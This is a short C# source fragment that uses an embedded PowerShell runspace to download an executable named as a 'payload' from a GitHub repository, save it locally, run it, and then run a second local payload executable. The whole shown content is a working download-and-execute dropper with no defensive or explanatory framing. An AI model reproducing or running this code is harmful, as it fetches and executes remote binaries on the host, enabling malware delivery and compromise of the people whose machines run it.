...
namespace Powershell
{
    class Program
    {
        static void Main(string[] args)
        {
            ...
            ps.AddArgument("$url = 'https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/Csharp2Powershell/Csharp2PowershellOnlinePayload.exe';$output = 'Csharp2PowershellOnlinePayloadDownloaded.exe';wget $url -outfile $output;./Csharp2PowershellOnlinePayloadDownloaded.exe;./Csharp2PowershellOfflinePayload.exe;");
            ps.Invoke();
        }
    }
}